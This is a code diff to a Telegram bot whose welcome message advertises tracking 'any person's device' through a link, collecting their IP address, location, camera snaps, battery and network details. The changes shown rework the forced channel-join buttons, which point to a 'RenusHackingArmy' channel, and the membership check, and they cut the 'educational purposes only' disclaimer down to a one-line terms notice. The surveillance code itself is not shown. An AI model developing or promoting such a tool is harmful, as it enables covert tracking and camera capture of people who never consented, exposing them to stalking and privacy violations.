@@ -90,8 +90,8 @@ if (msg.text == "/start") {
       var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.\nAfter joining all channels Please click /start command`;
 
 const joinButtons = [
-  [{ text: 'JOIN CHANNEL', url: 'https://t.me/RenusHackingArmy' }],
-  [{ text: 'JOIN CHANNEL', url: 'https://t.me/RenusBotsChannel' }], 
+  [{ text: 'JOIN CHANNEL', url: 'https://t.me/RenusHackingArmy' },
+  { text: 'JOIN CHANNEL', url: 'https://t.me/RenusBotsChannel' }], 
   [{ text: 'Joined', callback_data: 'joined' }]
 ];
 
@@ -216,15 +216,17 @@ var m = {
   // Send the message to the user
   bot.sendMessage(chatId, message, m);
 }
+ 
 async function handleStartCommand(chatId) {
-  const userId = msg.from.id;
+  try {
+    const userId = chatId;
 
     let isMemberOfAllChannels = true;
 
     for (let channel of channels) {
       try {
         const chatMember = await bot.getChatMember(channel, userId);
-        if (chatMember.status == 'left' || chatMember.status == 'kicked') {
+        if (chatMember.status === 'left' || chatMember.status === 'kicked') {
           isMemberOfAllChannels = false;
           break;
         }
@@ -235,36 +237,28 @@ async function handleStartCommand(chatId) {
     }
 
     if (!isMemberOfAllChannels) {
-      var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;
-      const channelLinks = [
-  'https://t.me/RenusHackingArmy',
-  'https://t.me/RenusBotsChannel',
-  // Add more channel links here
-];
-
-const joinButtons = channelLinks.map(link => {
-  return [
-    { text: `Join Channel`, url: link },
-    { text: `Joined`, callback_data: 'start_command' }
-  ];
-});
-
-const joinMarkup = {
-  reply_markup: JSON.stringify({
-    inline_keyboard: joinButtons
-  })
-};
+      const joinMessage = `Welcome! Please join both channels. After joining, tap "JOINED" to confirm.`;
+      const joinButtons = channels.map(channel => [{ text: 'JOIN CHANNEL', url: channel }, { text: 'Joined', callback_data: 'joined' }]);
+      
+      const joinMarkup = {
+        reply_markup: JSON.stringify({
+          inline_keyboard: joinButtons
+        })
+      };
 
       bot.sendMessage(chatId, joinMessage, joinMarkup);
     } else {
-      var m = {
+      const termsMarkup = {
         reply_markup: JSON.stringify({
           "inline_keyboard": [[{ text: "ACCEPT TERMS AND CONDITIONS", callback_data: "terms" }]]
         })
       };
 
-      bot.sendMessage(chatId, `Read the terms and conditions of this bot. If you use this bot so you agree to abide by our terms and conditions. This bot is made available for educational purposes only. I am not responsible for any illegal activities that result from the use of this bot. If you use this bot, you do so at your own risk. And if it causes any harm to anyone, then you yourself will be responsible for it. And thank you for using our service.`, m);
+      bot.sendMessage(chatId, `Read the terms and conditions. By using this bot, you agree to them.`, termsMarkup);
     }
+  } catch (error) {
+    console.error('Error in handleStartCommand:', error);
+  }
 }
 
 app.get("/", (req, res) => {
